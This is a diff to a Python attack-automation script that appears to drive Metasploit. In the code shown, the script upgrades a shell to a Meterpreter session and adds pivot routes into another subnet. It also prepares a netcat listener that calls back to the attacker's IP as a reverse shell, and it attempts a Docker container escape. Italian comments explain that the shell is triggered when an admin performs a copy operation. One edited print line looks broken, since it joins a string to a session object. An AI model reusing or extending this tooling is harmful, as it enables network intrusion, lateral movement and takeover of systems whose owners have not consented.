@@ -93,10 +93,10 @@ def main_procedure (attacker_ip, config_file, stealth=False, stealth_sleep=0):
             met_sess=mc.upgrade_shell(atk_sess)
             if(met_sess):
                 print(f"{C.COL_YELLOW}[*] Meterpreter session received, adding routes{C.COL_RESET}")
-                mc.route_add(met_sess, target_ip)
+                mc.route_add(met_sess["id_sess"], target_ip)
                 mc.route_print()
                 router=met_sess
-                print ("router =" + router )
+                print("router   "+ router)
             else:
                 print(f"{C.COL_RED}[*] Meterpreter session not received, can't add routes, skipping...{C.COL_RESET}")
                 continue
@@ -174,7 +174,7 @@ def main_procedure (attacker_ip, config_file, stealth=False, stealth_sleep=0):
                         #sulla macchina che è in un'altra sottorete e che normalmente non permetterebbe di ottenere una reverse shell.
                         #verrà inoltre rimossa la regola di routing perché non più necessaria una volta che abbiamo una sessione
                         
-                        mc.prepare(router, C.NETCAT_PORT, LPORT, attacker_ip)
+                        mc.prepare(router["id_sess"], C.NETCAT_PORT, LPORT, attacker_ip)
                         #tentiamo la connessione da netcat in entrata dall'operazione di copia effettuata da un admin
                         escape=mc.docker_escape(atk_sess)
                         if(escape):
